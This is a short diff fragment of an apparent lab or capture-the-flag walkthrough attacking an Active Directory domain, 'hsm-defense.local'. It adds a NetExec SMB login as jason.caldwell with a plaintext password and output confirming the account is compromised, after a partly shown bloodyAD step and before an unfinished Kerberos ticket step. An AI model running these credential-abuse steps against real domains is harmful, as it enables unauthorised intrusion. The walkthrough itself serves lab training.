@@ -357,5 +357,15 @@ bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' -p 
 Then using bloodyAD once again as `luke.harrison` i can reset his logon hours
 
 ```python
+nxc smb $target -u 'jason.caldwell' -p 'Password123' -k                              
+SMB         dc.hsm-defense.local 445    dc               [*]  x64 (name:dc) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\jason.caldwell:Password123
+```
+
+This user is now compromised!
+
+Then ill generate a TGT and krb5.conf file and export them both
+
+```python
 
 ```
